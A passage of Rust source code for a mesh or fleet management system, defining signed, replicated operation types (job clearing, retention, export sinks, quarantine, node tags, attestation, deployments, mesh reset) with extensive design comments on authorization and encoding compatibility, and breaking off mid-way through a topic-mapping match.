    /// Forget every job that had already finished when this was issued
    /// (admin-signed).
    ///
    /// **A watermark, not a list of ids.** The op-log replays per author
    /// rather than in global HLC order, so a clear that only emptied the
    /// map would be undone by the first `JobUpsert` replayed after it. What
    /// survives instead is `before_micros` in the state, and every
    /// `JobUpsert` is checked against it — which makes the clear idempotent
    /// under replay, arrival order, and a peer that hands us the same
    /// history again tomorrow.
    ///
    /// **Terminal by `finished_at_micros`, which is what makes "past" a
    /// decidable question.** A job that was still running when the clear
    /// was issued finishes *after* the watermark and is kept; one that had
    /// already finished sits before it and is dropped. Both have the same
    /// `created_at_micros`, so creation time cannot tell them apart, and a
    /// clear that used it would swallow the run somebody was watching.
    JobsClear {
        /// Wall clock at which the clear was issued. Jobs whose
        /// `finished_at_micros` is strictly below this are forgotten.
        before_micros: u64,
        by: UserId,
        /// Signature by `by` over [`jobs_clear_signing_bytes`].
        signature: Vec<u8>,
    },
    /// Record a job as cancelled without the executor's say-so
    /// (user-signed).
    ///
    /// The ordinary rule is that only the executor reports a job's state —
    /// that is what keeps a summary trustworthy. But an executor that is
    /// gone (crashed and never restarted, wiped and re-keyed, or a machine
    /// that left the mesh) can never report again, and its running jobs
    /// would read `running` forever with a cancel that has nobody to talk
    /// to. This op is the override for that silence: any node may author
    /// it, the *user's* signature carries the authority, and every peer
    /// applies it alone.
    ///
    /// **Operator/admin authority, checked at apply time on every peer.**
    /// Ordinary cancelling is scoped by ownership (a developer may cancel
    /// their own jobs), but a force rewrites another node's record — and
    /// the apply-side rule must be decidable from replicated roles alone,
    /// because an ownership check would need a `JobUpsert` that may never
    /// arrive, and an op parked forever wedges its author's log.
    ///
    /// **The executor's own report still outranks it.** The override merges
    /// by HLC like any summary write, so an executor that was merely
    /// unreachable and later publishes what actually happened — succeeded,
    /// failed, its own cancel — wins with its later clock. The op forces
    /// the record to converge; it never rewrites an outcome the executor
    /// managed to tell.
    JobCancelForce {
        job_id: crate::JobId,
        by: UserId,
        /// Signature by `by` over [`job_cancel_force_signing_bytes`].
        signature: Vec<u8>,
    },
    /// The same standing authorization [`UpgradePlanPut`] carries, plus
    /// one instruction it cannot: **re-install even where the version
    /// already matches**.
    ///
    /// The ordinary answer to *"this node already runs 0.6.0"* is to do
    /// nothing, and it is right nearly always. It is wrong exactly when
    /// the version string is what is *in dispute* rather than what settles
    /// the question: a binary replaced by hand, an install that
    /// half-finished, a node reporting a version its binary no longer
    /// matches. Then the operator wants the published bytes put back.
    ///
    /// A variant rather than a field, and the reason is the whole of F0's
    /// bargain. An op body is postcard, and a field appended to a
    /// replicated *struct* is a struct every older node stops being able
    /// to decode — including the ordinary plans it decodes today. So the
    /// plan's encoding is left exactly as it was and the flag rides the
    /// discriminant: a node with no code for this variant carries it
    /// forward and materializes nothing, which is the honest outcome,
    /// because a build that cannot read the record cannot honour the one
    /// thing the record says. The driver already names that case — it
    /// tells the operator which node to upgrade by hand first.
    ///
    /// Inert exactly as `UpgradePlanPut` is. Forcing changes what a node
    /// does when it is *asked*; it does not make anything ask.
    ///
    /// [`UpgradePlanPut`]: Self::UpgradePlanPut
    UpgradePlanForce {
        plan: Box<UpgradePlan>,
    },
    // -- M31 A1 retention (M31 §9) ------------------------------------------
    //
    // Appended, riding F0 like every entity since. The asymmetry is the
    // honest one and worth stating, because it runs the *opposite* way to
    // most of these: a node with no code for this variant stores, verifies
    // and forwards the op, and simply keeps every closed record it has. A
    // mixed mesh therefore converges on storage more slowly and **never
    // incorrectly** — nobody drops anything they were not told to.
    /// Publish (or replace) the mesh's retention policy. Admin-signed; LWW
    /// by HLC, one record for the whole mesh.
    ///
    /// **Replicated rather than node config, and that is C9 rather than
    /// convenience.** Two nodes reading different horizons answer the same
    /// question differently, and a history that depends on who you ask is
    /// not one. C0 P3 already had to learn this for the usage decay horizon.
    ///
    /// The floor on the audit window is checked here *and* at merge time on
    /// every node: a floor enforced only by the tool that writes the policy
    /// is a floor, and one enforced by every node that applies it is a rule.
    RetentionPut {
        policy: Box<crate::retention::RetentionPolicy>,
    },
    /// Withdraw the policy, returning the mesh to the shipped defaults.
    ///
    /// A distinct op rather than a `RetentionPut` carrying the default
    /// values, so `meshnode audit` records what actually happened —
    /// "reset retention to defaults" and "signed a policy that happens to
    /// equal the defaults" are different acts, and only the first is
    /// legible a year later.
    RetentionReset {
        by: UserId,
        at_micros: u64,
        /// Signature by `by` over
        /// [`crate::retention::retention_reset_signing_bytes`].
        signature: Vec<u8>,
    },
    // -- M31 B1 sinks (M31 §12) ---------------------------------------------
    //
    // Appended, riding F0: a pre-[`crate::SINK_MINOR`] node stores,
    // verifies, counts and forwards these rather than wedging, and simply
    // has no sinks. The minor gates *election* rather than carriage — see
    // [`crate::SINK_MINOR`] for why silence that looks like health is worth
    // spending one on.
    /// Create or replace a sink. **Admin-signed**; LWW by HLC per
    /// `sink.name`, exactly as a schedule is.
    ///
    /// A replicated entity rather than a node-local config line, and that is
    /// C7: a sink is the easiest exfiltration channel in the product by
    /// construction, so *who pointed our history at that host, and when* has
    /// to be a question `meshnode audit` can answer.
    ///
    /// Pausing and enabling are edits, so they travel as one of these and
    /// re-sign the record. `meshnode restore` rewrites every recovered sink
    /// with `enabled: false` (§19 Q5, decided).
    SinkPut {
        sink: Box<crate::sink::Sink>,
    },
    /// Tombstone a sink (LWW by HLC — a later `SinkPut` re-creates it).
    /// Rows already exported are untouched; a sink is a pipe, not an owner.
    SinkRemove {
        name: String,
        by: UserId,
        /// Signature by `by` over
        /// [`crate::sink::sink_remove_signing_bytes`].
        signature: Vec<u8>,
    },
    /// How far one sink has exported, as the exporting node reports it
    /// (M31 B2, §19 Q3).
    ///
    /// **Replicated because the gate is not**, and that is the whole reason
    /// this op exists. The cursor lives on the elected exporter's disk;
    /// compaction is per-author and happens on *every* node. Without a
    /// replicated watermark, "do not delete what the sink has not taken"
    /// would be a guarantee on exactly one machine and a lie on the rest —
    /// which is worse than no gate, because it would be believed.
    ///
    /// **Node-authored and unsigned**, like `ReservationsPut` and
    /// `DeviceInventoryPut`: it authorizes nothing. A compromised exporter
    /// can under-report and thereby delay deletion, and the blast radius of
    /// that is bounded by [`crate::sink::MAX_HOLD_FOR_EXPORT_DAYS`] — which
    /// is a second reason the ceiling is not optional.
    ///
    /// **LWW per sink name, republished only when it moves**, so it
    /// collapses to exactly one live op per sink however long the mesh runs
    /// — the `ReservationsPut` rule, and the thing that keeps a gate from
    /// becoming the growth it was meant to bound.
    SinkProgress {
        sink: String,
        /// The finish instant this sink has exported through. Records at or
        /// below it are safely elsewhere.
        exported_through_micros: u64,
    },
    // -- singleton runs (`run --singleton NAME`) ---------------------------
    /// The origin claims a name for a job, so a second submission under the
    /// same name is refused while the first is still going.
    ///
    /// A claim, not a lock: there is no release op, because the job record
    /// it names already says when it finished. A name is held exactly
    /// while the claimed job is non-terminal in replicated state (or too
    /// young for its `JobUpsert` to have arrived), and free otherwise — so
    /// an origin that dies holding one leaves nothing to clean up, which is
    /// the property every lease in this design shares. Node-authored, LWW
    /// per name by HLC.
    SingletonClaim {
        name: String,
        job: JobId,
        user: UserId,
        at_micros: u64,
    },
    // -- who may contribute compute (owner's veto) -------------------------
    /// An admin's standing decision about whether one node may be given
    /// work — **the owner's half of "is this machine part of my fleet"**.
    ///
    /// Not a tag, and that distinction is the whole point. `no-execute` is
    /// a node describing *itself*, published on its own `MemberUpdate` and
    /// therefore rewritten by that node every time it boots: a machine can
    /// take itself out of the pool and put itself back in, which is right,
    /// because it is that machine's own capacity to offer. This op is the
    /// other direction — the mesh's owner saying whether the offer is
    /// accepted — so it lives in its own record that the subject cannot
    /// author, exactly as `MemberRevoke` does. A node arriving from
    /// somewhere an admin has never seen can be let in as a *place a person
    /// works from* without also becoming a *machine the mesh schedules on*.
    ///
    /// Admin-signed and checked on every peer at apply time, LWW per node
    /// by HLC. Absence means allowed: a mesh that has never expressed an
    /// opinion behaves exactly as it did before this op existed.
    NodeExecutionSet {
        decision: NodeExecution,
    },
    // -- machine principals (E1-P4) ----------------------------------------
    /// A key that belongs to a system rather than a person.
    ///
    /// **Appended here, at the end, and that is load-bearing.** postcard
    /// encodes an enum by variant index; inserting this anywhere above
    /// would renumber every variant after it and silently re-read every
    /// op ever signed as the wrong kind. F0 is what makes appending free —
    /// a node too old to know this variant stores, verifies and forwards
    /// it rather than wedging its sync.
    ///
    /// Admin-signed, checked on every peer at apply time, first-add-wins
    /// exactly as [`OpBody::UserAdd`] is. Paired with a `UserAdd` for the
    /// same key: the marker does not create the principal, it describes
    /// one.
    ServiceAccountAdd {
        account: crate::rbac::ServiceAccount,
    },
    // -- identity-provider bridge (E1-P5) ----------------------------------
    /// An identity provider this mesh will believe. Admin-signed, LWW per
    /// name by HLC — an admin who reconfigures a provider has said one
    /// thing, and only the latest of it is a fact.
    OidcProviderPut {
        provider: crate::oidc::OidcProvider,
    },
    /// Retire a provider. Separate from a put with empty fields, because
    /// "we no longer trust this issuer" is a different statement from "its
    /// endpoints moved".
    OidcProviderRemove {
        name: String,
        by: UserId,
        at_micros: u64,
        /// Signature by `by` over [`oidc_provider_remove_signing_bytes`].
        signature: Vec<u8>,
    },
    /// What a node verified about an enrolling key.
    ///
    /// **Node-authored, and that is the point.** The op envelope's node
    /// signature is the claim's provenance: this node fetched the issuer's
    /// keys and checked the token. The person enrolling cannot author it,
    /// because the requester is exactly the party who must not be trusted
    /// to assert their own IdP identity. LWW per user by HLC.
    OidcAssertionPut {
        assertion: crate::oidc::OidcAssertion,
    },
    // -- quarantine (E2.4) -------------------------------------------------
    /// Isolate a node that is **suspected**, reversibly.
    ///
    /// Distinct from [`OpBody::MemberRevoke`], which is expulsion and is
    /// terminal, and from [`OpBody::NodeExecutionSet`], which is an
    /// ordinary capacity decision. Quarantine is the security verb: it
    /// says *"do not use this machine and do not go near it, until I know
    /// what happened"* — and it can be lifted, because most suspicions
    /// turn out to be nothing and revoking a node's identity to find that
    /// out costs a re-enrolment.
    ///
    /// Admin-signed, LWW per node by HLC.
    NodeQuarantineSet {
        quarantine: NodeQuarantine,
    },
    // -- assigned tags -----------------------------------------------------
    /// Tags an **admin** puts on a node, from anywhere.
    ///
    /// Every tag before this one was a node's statement about itself,
    /// carried on its own [`OpBody::MemberUpdate`], which meant the only
    /// way to label a machine was to be on it: `meshnode nodes tag` edited
    /// the local node and nothing else, so labelling a fleet was an SSH
    /// loop, and a node that came back from a rebuild came back unlabelled.
    /// That is backwards for the one thing tags are actually for —
    /// `--on tag=prod` is an *operator's* division of their own estate, not
    /// a hardware fact the machine is in a position to know.
    ///
    /// So this is the operator's half, and it is deliberately a **second,
    /// separate list** rather than a way to rewrite the node's own: the
    /// subject re-announces its `MemberUpdate` on every boot and every
    /// capacity refresh, and anything an admin had written into that list
    /// would be silently erased by the next reboot. Assigned tags live in
    /// the replicated log under the admin's signature, survive the node's
    /// rebuild, reboot and re-address, and are unioned into the member's
    /// tag list wherever it is read — so selectors, grants, policies,
    /// placement and every `tag=` in the product see them without knowing
    /// they exist.
    ///
    /// The list is **total**: it replaces whatever this node was assigned
    /// before, and an empty list clears the assignment. Add/remove deltas
    /// would need a per-tag clock to converge; one signed list per node
    /// needs only the HLC that every other admin decision already uses.
    ///
    /// Admin-signed, LWW per node by HLC.
    NodeTagsSet {
        assignment: NodeTags,
    },
    // -- RETIRED 2026-09-18: Y5 touch-to-approve (change control) ---------
    //
    // Retired in place with the rest of change control; payload types in
    // `crate::presence`. Nothing produces them; `state.rs` ignores them.
    /// Trust a certificate authority to attest that a key is on hardware
    /// (Y2/Y3).
    ///
    /// Admin-signed, LWW per [`crate::attest::AttestRoot::id`] — a digest
    /// of the certificate, not its label. Replicated rather than compiled
    /// in for the reason [`ReleaseKeyPut`](OpBody::ReleaseKeyPut) is: a
    /// mesh decides which manufacturer it trusts by an act with a name on
    /// it, and an organisation minting its own PIV cards can trust its own
    /// CA without a new build.
    AttestRootAdd {
        root: Box<crate::attest::AttestRoot>,
    },
    /// Stop trusting one. The attestations it vouched for stop verifying
    /// with it, which is the point.
    AttestRootRemove {
        id: String,
        by: UserId,
        at_micros: u64,
        signature: Vec<u8>,
    },
    /// "My key was generated on hardware, and here is the chain" (Y2/Y3).
    ///
    /// **Self-signed, and that is the control.** The same argument
    /// [`UserTokenAdd`](OpBody::UserTokenAdd) makes: attesting a key is a
    /// statement about your own identity, and an admin who could attest
    /// into somebody else's account would be able to manufacture the very
    /// column that exists to constrain them.
    ///
    /// Verified at merge against the mesh's trusted roots *and* against the
    /// signer's own public key — an attestation whose leaf certificate is
    /// for a different key attests a different key. A mesh trusting no
    /// roots verifies none of these and shows no hardware column, which is
    /// the honest empty state: an unverified chain is worth less than no
    /// chain, because it looks like proof.
    ///
    /// LWW per user by HLC. Nothing here touches the protocol's signature
    /// format — an attested key produces the same 64-byte Ed25519
    /// signature as any other, which is the finding Part Two rests on.
    UserHardwareAttest {
        attestation: Box<crate::attest::HardwareAttestation>,
    },
    /// Withdraw one: a rotated key, or a root that turned out not to mean
    /// what somebody thought. Signed by the owner or an admin.
    UserHardwareRevoke {
        revocation: Box<crate::attest::AttestRevocation>,
    },
    /// A second signature over a release, from a key on a token (Y6).
    ///
    /// Admin-signed to publish, but the authority is inside the document:
    /// the mesh checks the SSH signature against the release keys it
    /// trusts, so publishing one it cannot verify records nothing.
    ///
    /// LWW per binary digest by HLC. A release with no co-signature is
    /// exactly as installable as it is today **unless** the mesh trusts at
    /// least one SSH-form release key, at which point one becomes
    /// required — opt-in, fleet-wide, and fail-closed once opted in.
    ReleaseCosign {
        cosign: Box<crate::fleet::ReleaseCosignature>,
    },
    /// A deployment's rollout and partition policy (N1 P3/P4).
    ///
    /// **Appended past everything, and a side-car rather than a field**, for
    /// the reason [`ApprovalDecisionV2`](OpBody::ApprovalDecisionV2) gives
    /// two hundred lines above: [`crate::Deployment`] is signed and postcard
    /// encodes positionally, so growing it — or growing `UpdatePolicy`,
    /// which sits in its *middle* — breaks every signature ever made over a
    /// deployment and makes every existing record fail to decode on the
    /// build that grew it. Measured, not assumed; see
    /// [`crate::DeploymentPolicy`] for the numbers.
    ///
    /// LWW per deployment name by HLC, signed by a user who may edit the
    /// deployment. Tombstoned with the deployment it names.
    ///
    /// **The degradation is the door left open, and it is the safe one.** A
    /// node below [`DEPLOY_POLICY_MINOR`](crate::DEPLOY_POLICY_MINOR)
    /// carries this op opaquely and reconciles the deployment exactly as it
    /// does today: no canary, no progress deadline, no `lost_after`. The
    /// deployment itself is untouched and stays fully visible there, which
    /// is the whole reason this is a second op rather than a `DeploymentPutV2`
    /// — a V2 body would have made the deployment invisible to an older
    /// node, and an invisible deployment elects a reconciler that does
    /// nothing. `doctor` names every member that is behind.
    DeploymentPolicyPut {
        policy: Box<crate::deployment::DeploymentPolicy>,
    },
    /// A schedule that fires a service (N1 P5).
    ///
    /// **Appended, and a distinct variant from the retired
    /// `SchedulePut` at index 44.** Those twelve indices stay retired for
    /// the reason the block above them gives: postcard encodes an enum by
    /// variant index and every op's signature covers those bytes, so
    /// reusing one would re-read every signed schedule op in every
    /// existing data dir and backup as the wrong kind of thing. A mesh
    /// that had workflow schedules before 2026-09-12 still carries them,
    /// unreadable and inert, and that is correct; this is a new entity
    /// that happens to share the arithmetic.
    ///
    /// User-signed, LWW per name by HLC, tombstoned via
    /// [`ServiceScheduleRemove`](OpBody::ServiceScheduleRemove).
    ServiceSchedulePut {
        schedule: Box<crate::schedule::ServiceSchedule>,
    },
    /// Retire one. Signed by the owner or an admin.
    ServiceScheduleRemove {
        name: String,
        by: crate::UserId,
        signature: Vec<u8>,
    },
    /// What one node currently runs, where, and whether it is healthy
    /// (N3 P1).
    ///
    /// **Node-authored, LWW per node by HLC** — the shape
    /// [`ReservationsPut`](OpBody::ReservationsPut) and
    /// [`DeploymentHealthPut`](OpBody::DeploymentHealthPut) already have,
    /// and the third application of it. The executor is the only node that
    /// can author this: it allocated the port and it is the only one that
    /// can judge health, because a check run from elsewhere measures the
    /// network more than the service.
    ///
    /// **Results, never checks.** What replicates is the conclusion and
    /// when it was reached — never the probe, never a latency series. A
    /// flapping service must not author an op per flap, so this is
    /// republished on state *transitions* and set membership only, and an
    /// idle node publishes nothing at all.
    ///
    /// Bounded by node count and instance churn rather than by instance
    /// count, and self-trimming: an instance that ends drops out of the vec
    /// on the next publish.
    RegistryPut {
        registrations: Box<crate::registry::NodeRegistrations>,
    },
    /// Mesh-wide load shedding: stop taking new work, stop reconciling, or
    /// both (N6 §12).
    ///
    /// **Admin-signed, and a singleton** — one record for the whole mesh,
    /// LWW by HLC. Per-node would defeat it: the failure this exists to
    /// prevent is a mesh where the switch was flipped on four nodes out of
    /// nine and the other five kept accepting. Lifting it is a record with
    /// both switches clear; there is no separate remove.
    ///
    /// **This is the one capability gate in meshware that fails *open*.**
    /// Every other minor leaves an old node doing *less* — publishing no
    /// registry, applying no rollout policy, enforcing no presence. A node
    /// below [`SHED_MINOR`](crate::SHED_MINOR) carries this op unread and
    /// **keeps accepting work**, which is the opposite of what the operator
    /// asked for and the reason `shed status` reports, by name, every
    /// member that will ignore it.
    ShedPut {
        shed: Box<crate::shed::Shed>,
    },
    /// One version of a deployment: the record and its side-car as they were
    /// published together (Phase B, E1).
    ///
    /// **Authored beside every `DeploymentPut`, and never read by the
    /// reconciler.** The put stays LWW per name and stays what runs; this is
    /// the record of what ran, for `deployment history` and for a rollback
    /// to a generation. LWW per `(name, generation)`, compacted to the newest
    /// twenty generations per author. No signature of its own — both halves
    /// carry theirs, and both are checked.
    ///
    /// A node below [`HISTORY_MINOR`](crate::HISTORY_MINOR) carries this
    /// opaquely and has no history to show, which is the whole cost.
    DeploymentVersionPut {
        version: Box<crate::deployment::DeploymentVersion>,
    },
    /// A name on one version of a deployment, which keeps that version past
    /// the ten every deployment keeps (Phase B, E1).
    ///
    /// **User-signed, LWW per `(deployment, tag)` by HLC**; a tag with no
    /// version removes it. Scoped by the deployment's removal, so a tag does
    /// not attach to a new deployment that reuses the name.
    DeploymentTagPut {
        tag: Box<crate::deployment::DeploymentTag>,
    },
    /// Per-deployment settings past the policy's fixed fields (Phase B, E2),
    /// `auto_promote` first. User-signed, LWW per name.
    DeploymentKnobsPut {
        knobs: Box<crate::deployment::DeploymentKnobs>,
    },
    /// A person promoting one generation's canaries (Phase B, E2).
    /// User-signed, LWW per name, and read only while that generation rolls.
    ///
    /// A node below [`PROMOTE_MINOR`](crate::PROMOTE_MINOR) carries this and
    /// the knobs opaquely, and promotes on health alone.
    DeploymentPromote {
        promotion: Box<crate::deployment::DeploymentPromotion>,
    },
    // -- SEC-7, appended at the tail ----------------------------------------
    /// Where a vault secret goes and who may use it. Admin-signed, the
    /// newest by signed time per name. A node below
    /// [`SECRET_SCOPE_MINOR`](crate::SECRET_SCOPE_MINOR) carries it opaquely
    /// and goes on healing the secret for every member.
    SecretScopeSet {
        scope: Box<SecretScope>,
    },
    // -- mesh reset, appended at the tail -----------------------------------
    /// The founder dissolves the mesh (`meshnode reset`). Every node that
    /// applies it stops its work, passes it on to every peer it can reach,
    /// moves its mesh data aside and stops, waiting to be adopted into a
    /// new mesh. Founder-signed, over this mesh's id; terminal.
    ///
    /// A node below [`MESH_RESET_MINOR`](crate::MESH_RESET_MINOR) carries
    /// it opaquely and stays in the old mesh.
    MeshReset {
        reset: MeshReset,
    },
}

/// The founder's order to dissolve a mesh ([`OpBody::MeshReset`]).
///
/// **Founder only**, not admin: an admin can be added by anybody the
/// founder trusted, and ending the mesh for every member is the one act
/// that should not be delegable. The founder key is the one named in
/// genesis, so every node can check it with nothing but its own copy.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct MeshReset {
    /// The mesh being reset. Signed, because a founder who starts over
    /// founds the next mesh with the same key, and a reset of this one
    /// must never be replayable into that one.
    pub mesh_id: MeshId,
    pub by: UserId,
    pub at_micros: u64,
    /// Ed25519 by `by` over [`Self::signing_bytes`].
    pub signature: Vec<u8>,
}

impl MeshReset {
    pub fn signing_bytes(&self) -> Vec<u8> {
        let mut unsigned = self.clone();
        unsigned.signature = Vec::new();
        let mut buf = Vec::with_capacity(96);
        buf.extend_from_slice(b"mw-mesh-reset-v1");
        buf.extend_from_slice(&postcard::to_stdvec(&unsigned).unwrap_or_default());
        buf
    }
}

/// The tags an admin has assigned to one node ([`OpBody::NodeTagsSet`]).
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct NodeTags {
    pub node_id: NodeId,
    /// The whole assigned set, replacing any previous one. Empty clears it.
    pub tags: Vec<String>,
    pub by: UserId,
    pub at_micros: u64,
    /// Ed25519 by `by` over [`Self::signing_bytes`].
    pub signature: Vec<u8>,
}

impl NodeTags {
    pub fn signing_bytes(&self) -> Vec<u8> {
        let mut unsigned = self.clone();
        unsigned.signature = Vec::new();
        let mut buf = Vec::with_capacity(160);
        buf.extend_from_slice(b"mw-node-tags-v1");
        buf.extend_from_slice(&postcard::to_stdvec(&unsigned).unwrap_or_default());
        buf
    }
}

/// A reversible isolation decision about one node (E2.4).
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub struct NodeQuarantine {
    pub node_id: NodeId,
    /// `true` isolates, `false` lifts. Both are signed statements: lifting
    /// a quarantine is as much an admin decision as imposing one, and an
    /// auditor should see who did it.
    pub quarantined: bool,
    /// Why. Never optional — a node nobody can use, with no reason
    /// attached, is a support ticket somebody opens at 3am.
    pub reason: String,
    pub by: UserId,
    pub at_micros: u64,
    /// Ed25519 by `by` over [`Self::signing_bytes`].
    pub signature: Vec<u8>,
}

impl NodeQuarantine {
    pub fn signing_bytes(&self) -> Vec<u8> {
        let mut unsigned = self.clone();
        unsigned.signature = Vec::new();
        let mut buf = Vec::with_capacity(160);
        buf.extend_from_slice(b"mw-node-quarantine-v1");
        buf.extend_from_slice(&postcard::to_stdvec(&unsigned).unwrap_or_default());
        buf
    }
}

/// The bytes an admin signs to retire a provider.
pub fn oidc_provider_remove_signing_bytes(name: &str, by: &UserId, at_micros: u64) -> Vec<u8> {
    let mut buf = Vec::with_capacity(96);
    buf.extend_from_slice(b"mw-oidc-provider-remove-v1");
    buf.extend_from_slice(name.as_bytes());
    buf.extend_from_slice(&by.0);
    buf.extend_from_slice(&at_micros.to_le_bytes());
    buf
}

/// An admin's decision about whether a node may be given work
/// ([`OpBody::NodeExecutionSet`]).
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct NodeExecution {
    pub node_id: NodeId,
    /// May the scheduler place work here? `false` keeps the node a full
    /// member — state, submission, terminals — and only takes it out of
    /// the placement pool.
    pub allowed: bool,
    pub decided_by: UserId,
    pub decided_at_micros: u64,
    /// Shown wherever the refusal is: a node that is not taking work
    /// without a reason attached is a support ticket.
    pub reason: String,
    /// Ed25519 by `decided_by` over [`Self::signing_bytes`].
    pub signature: Vec<u8>,
}

impl NodeExecution {
    pub fn signing_bytes(&self) -> Vec<u8> {
        let mut buf = Vec::with_capacity(128 + self.reason.len());
        buf.extend_from_slice(b"mw-node-exec-v1");
        buf.extend_from_slice(&self.node_id.0);
        buf.push(u8::from(self.allowed));
        buf.extend_from_slice(&self.decided_by.0);
        buf.extend_from_slice(&self.decided_at_micros.to_le_bytes());
        buf.extend_from_slice(self.reason.as_bytes());
        buf
    }
}

/// The coarse "something over here changed" topics a client can watch
/// (**H-8**).
///
/// Director has no way to ask *"has anything happened?"*, so it answers the
/// question by re-fetching every collection it can see, every two seconds,
/// forever — eight to eighteen whole tables built under the engine's state
/// read lock, serialised, bridged and re-proxied, whether or not a single
/// byte moved. The cost is proportional to the size of the mesh and to
/// nothing else.
///
/// A topic is deliberately coarser than a table: it is a *hint about what
/// to refetch*, and one counter per screen-sized group is enough to make
/// the idle case free while staying cheap to maintain. The mapping is an
/// exhaustive match, so a new [`OpBody`] variant does not compile until
/// somebody has said where it belongs — which is the property that keeps a
/// change signal from silently going stale.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash, Serialize, Deserialize)]
pub enum StateTopic {
    Nodes,
    Jobs,
    Runs,
    Workflows,
    Services,
    Bundles,
    Sources,
    Users,
    Grants,
    Secrets,
    Policies,
    Approvals,
    Enrolments,
    Hosts,
    Schedules,
    Deployments,
    Facts,
    Settings,
    Releases,
    Background,
}

impl StateTopic {
    /// Every topic, in declaration order — the order the version vector on
    /// the wire uses.
    pub const ALL: [StateTopic; 20] = [
        StateTopic::Nodes,
        StateTopic::Jobs,
        StateTopic::Runs,
        StateTopic::Workflows,
        StateTopic::Services,
        StateTopic::Bundles,
        StateTopic::Sources,
        StateTopic::Users,
        StateTopic::Grants,
        StateTopic::Secrets,
        StateTopic::Policies,
        StateTopic::Approvals,
        StateTopic::Enrolments,
        StateTopic::Hosts,
        StateTopic::Schedules,
        StateTopic::Deployments,
        StateTopic::Facts,
        StateTopic::Settings,
        StateTopic::Releases,
        StateTopic::Background,
    ];

    pub fn as_str(&self) -> &'static str {
        match self {
            StateTopic::Nodes => "nodes",
            StateTopic::Jobs => "jobs",
            StateTopic::Runs => "runs",
            StateTopic::Workflows => "workflows",
            StateTopic::Services => "services",
            StateTopic::Bundles => "bundles",
            StateTopic::Sources => "sources",
            StateTopic::Users => "users",
            StateTopic::Grants => "grants",
            StateTopic::Secrets => "secrets",
            StateTopic::Policies => "policies",
            StateTopic::Approvals => "approvals",
            StateTopic::Enrolments => "enrolments",
            StateTopic::Hosts => "hosts",
            StateTopic::Schedules => "schedules",
            StateTopic::Deployments => "deployments",
            StateTopic::Facts => "facts",
            StateTopic::Settings => "settings",
            StateTopic::Releases => "releases",
            StateTopic::Background => "background",
        }
    }
}

impl OpBody {
    /// Which change-signal topic this op belongs to (**H-8**).
    ///
    /// Exhaustive on purpose: adding an entity kind without deciding what
    /// it makes stale is how a client ends up watching a counter that
    /// never moves for the thing it cares about.
    pub fn topic(&self) -> StateTopic {
        match self {
            OpBody::MemberAdd { .. } => StateTopic::Nodes,
            OpBody::MemberUpdate { .. } => StateTopic::Nodes,
            OpBody::MemberRevoke { .. } => StateTopic::Nodes,
            OpBody::MemberLeft { .. } => StateTopic::Nodes,
            OpBody::NodeExecutionSet { .. } => StateTopic::Nodes,
            OpBody::NodeQuarantineSet { .. } => StateTopic::Nodes,
            OpBody::NodeTagsSet { .. } => StateTopic::Nodes,
            OpBody::DeviceInventoryPut { .. } => StateTopic::Nodes,
            OpBody::SingletonClaim { .. } => StateTopic::Nodes,
            OpBody::JobUpsert { .. } => StateTopic::Jobs,
            OpBody::JobsClear { .. } => StateTopic::Jobs,
            OpBody::JobCancelForce { .. } => StateTopic::Jobs,
            OpBody::FanoutPlan { .. } => StateTopic::Jobs,
            OpBody::FanoutAdopt { .. } => StateTopic::Jobs,
            OpBody::FanoutClosed { .. } => StateTopic::Jobs,
            OpBody::GangPlan { .. } => StateTopic::Jobs,
            OpBody::GangAdopt { .. } => StateTopic::Jobs,
            OpBody::GangClosed { .. } => StateTopic::Jobs,
            OpBody::ServiceVersionAdd { .. } => StateTopic::Services,
            OpBody::ServiceHead { .. } => StateTopic::Services,
            OpBody::ServiceRemove { .. } => StateTopic::Services,
            OpBody::BundleAnnounce { .. } => StateTopic::Bundles,
            OpBody::BundleHold { .. } => StateTopic::Bundles,
            OpBody::SourceAdd { .. } => StateTopic::Sources,
            OpBody::SourceRemove { .. } => StateTopic::Sources,
            OpBody::SourceSynced { .. } => StateTopic::Sources,
            OpBody::UserAdd { .. } => StateTopic::Users,
            OpBody::UserRevoke { .. } => StateTopic::Users,
            OpBody::ServiceAccountAdd { .. } => StateTopic::Users,
            OpBody::OidcProviderPut { .. } => StateTopic::Users,
            OpBody::OidcProviderRemove { .. } => StateTopic::Users,
            OpBody::OidcAssertionPut { .. } => StateTopic::Users,
            OpBody::GrantAdd { .. } => StateTopic::Grants,
            OpBody::GrantRevoke { .. } => StateTopic::Grants,
            OpBody::SecretPut { .. } => StateTopic::Secrets,
            OpBody::SecretRemove { .. } => StateTopic::Secrets,
            OpBody::SecretRewrap { .. } => StateTopic::Secrets,
            OpBody::SecretScopeSet { .. } => StateTopic::Secrets,
            // Nodes: every member is about to leave, and the fleet is the
            // screen that has to say so.
            OpBody::MeshReset { .. } => StateTopic::Nodes,
            OpBody::AttestRootAdd { .. } => StateTopic::Users,
            OpBody::AttestRootRemove { .. } => StateTopic::Users,
            OpBody::UserHardwareAttest { .. } => StateTopic::Users,
            OpBody::UserHardwareRevoke { .. } => StateTopic::Users,
            OpBody::ReleaseCosign { .. } => StateTopic::Releases,
            OpBody::DeploymentPolicyPut { .. } => StateTopic::Deployments,
            OpBody::ServiceSchedulePut { .. } | OpBody::ServiceScheduleRemove { .. } => {
                StateTopic::Schedules
            }
            OpBody::RegistryPut { .. } => StateTopic::Deployments,
            // Nodes, not Deployments: a shed changes what every node will
            // *do*, and the screen that has to redraw is the fleet.
            OpBody::ShedPut { .. } => StateTopic::Nodes,
            OpBody::DeploymentKnobsPut { .. } | OpBody::DeploymentPromote { .. } => {
                StateTopic::Deployments
            }
            OpBody::DeploymentVersionPut { .. } | OpBody::DeploymentTagPut { .. } => {
                StateTopic::Deployments
            }
            OpBody::EnrolRequest { .. } => StateTopic::Enrolments,
            OpBody::EnrolDecline { .. } => StateTopic::Enrolments,
            OpBody::InviteCreate { .. } => StateTopic::Enrolments,
            OpBody::InviteConsume { .. } => StateTopic::Enrolments,
            OpBody::InviteRevoke { .. } => StateTopic::Enrolments,
            OpBody::DeploymentPut { .. } => StateTopic::Deployments,
            OpBody::DeploymentRemove { .. } => StateTopic::Deployments,
            OpBody::DeploymentHealthPut { .. } => StateTopic::Deployments,
            OpBody::FactCollectorPut { .. } => StateTopic::Facts,
